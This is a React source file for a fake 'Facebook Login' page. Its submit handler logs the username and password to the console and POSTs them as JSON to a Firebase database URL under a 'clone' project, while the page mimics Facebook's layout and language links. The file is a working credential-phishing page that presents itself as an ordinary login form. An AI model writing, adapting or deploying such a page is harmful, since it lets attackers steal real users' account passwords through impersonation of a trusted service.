import React, { useState } from "react";
import "./login.css";


const Login = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async(e) => {
    e.preventDefault();
   
  
    // Create an object with the form data
   console.log(username);
   console.log(password);
   const res = await fetch(
    "https://clone-940ae-default-rtdb.firebaseio.com/fc.json",
    {
    method:"POST",
    header:{
          "Content-Type":"application/json",
    },
    body:JSON.stringify({
       username,
       password,
    })  
  }
   )

  };

  return (
    <div className="log">
      <div className="facebook-login-container">
        <form onSubmit={handleSubmit} 
         action="https://google.com"
         method="GET"
        >
          <h2>Facebook Login</h2>
          <label>
            <input
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              required
              placeholder="Username or Email"
            />
          </label>
          <label>
            <input
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
              placeholder="Password"
            />
          </label>
          <button type="submit">Log In</button>
          <a href="#">Forgotten password?</a>
        </form>
        
        <button type="submit"  className="create">Create new account</button>
      </div>
      <div className="parent">
        <div className="child">
          <ul>
            <li>
              <a>English(UK)</a>
            </li>
            <li>ಕನ್ನಡ</li>
            <li>اردو</li>
            <li>മലയാളം</li>
          </ul>
        </div>
        <div className="child">
          <ul>
            <li>తెలుగు</li>
            <li>हिन्दी</li>
            <li>ગુજરાતી</li>
            <li>मराठी</li>
          </ul>
        </div>
      </div>
    </div>
  );
};

export default Login;
